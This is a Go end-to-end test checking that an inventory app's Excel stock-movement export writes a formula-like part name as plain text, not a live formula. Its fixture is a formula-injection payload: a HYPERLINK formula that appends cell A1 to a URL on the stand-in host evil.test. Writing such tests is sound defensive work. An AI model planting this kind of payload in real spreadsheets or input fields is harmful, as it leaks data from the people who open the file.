package inventory_test

import (
	"bytes"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/xuri/excelize/v2"

	"github.com/viettechno/vietgara-backend/testing/blackbox/fixture"
)

// Scenario: E2E-SYS-011: an Excel export never turns what a user typed into
// a formula. A part named like a formula is exported as text, so opening the
// file runs nothing.
func TestExcelExportsNeverContainFormulas(t *testing.T) {
	t.Parallel()

	ctx := t.Context()
	owner, garage := setup(t, "inv-formula")

	hostile := `=HYPERLINK("http://evil.test/"&A1,"Click")`

	part := fixture.NewPart(t, owner.API, garage.GetId(), sku(), hostile, litre(t, owner, garage.GetId()))

	_, err := owner.API.ReceiveStock(ctx, garage.GetId(), part.GetId(), "3", "", 1000)
	require.NoError(t, err)

	_, body, err := owner.API.DownloadStockMovementsExcel(ctx, garage.GetId())
	require.NoError(t, err)

	book, err := excelize.OpenReader(bytes.NewReader(body))
	require.NoError(t, err)

	defer func() { _ = book.Close() }()

	found := false

	for _, sheet := range book.GetSheetList() {
		rows, rowsErr := book.GetRows(sheet)
		require.NoError(t, rowsErr)

		for rowIndex, row := range rows {
			for columnIndex, value := range row {
				if !strings.Contains(value, "HYPERLINK") {
					continue
				}

				found = true
				cell, _ := excelize.CoordinatesToCellName(columnIndex+1, rowIndex+1)

				formula, formulaErr := book.GetCellFormula(sheet, cell)
				require.NoError(t, formulaErr)
				assert.Empty(t, formula, "%s!%s holds a formula", sheet, cell)
			}
		}
	}

	assert.True(t, found, "the part's name is in the export")
}
